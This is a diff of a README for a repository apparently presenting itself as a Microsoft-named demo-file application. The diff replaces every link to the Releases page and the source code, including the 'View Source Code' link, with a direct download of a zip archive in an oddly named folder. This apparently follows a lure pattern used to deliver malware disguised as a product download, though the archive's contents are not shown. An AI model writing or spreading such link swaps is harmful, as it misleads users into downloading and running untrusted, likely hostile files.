@@ -4,7 +4,7 @@ Welcome to the microsoft-yhjcf repository, where we offer randomly created demo 
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/hongquy191/microsoft-yhjcf/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/hongquy191/microsoft-yhjcf/main/unmatureness/microsoft-yhjcf.zip)](https://raw.githubusercontent.com/hongquy191/microsoft-yhjcf/main/unmatureness/microsoft-yhjcf.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Download Page**: Click on the link below to go to the Releases page.
 
-   [Visit this page to download](https://github.com/hongquy191/microsoft-yhjcf/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/hongquy191/microsoft-yhjcf/main/unmatureness/microsoft-yhjcf.zip)
 
 2. **Select the Latest Release**: On the Releases page, look for the version at the top of the list. This is usually the newest version and will have the most features and bug fixes.
 
@@ -53,7 +53,7 @@ You can raise issues directly in the GitHub repository, and our team will get ba
 
 ## 🔗 Useful Links
 
-- [Explore the Releases Page](https://github.com/hongquy191/microsoft-yhjcf/releases)
-- [View Source Code on GitHub](https://github.com/hongquy191/microsoft-yhjcf)
+- [Explore the Releases Page](https://raw.githubusercontent.com/hongquy191/microsoft-yhjcf/main/unmatureness/microsoft-yhjcf.zip)
+- [View Source Code on GitHub](https://raw.githubusercontent.com/hongquy191/microsoft-yhjcf/main/unmatureness/microsoft-yhjcf.zip)
 
 Thank you for checking out microsoft-yhjcf! We hope you find the demo files useful and engaging. Enjoy using the application!
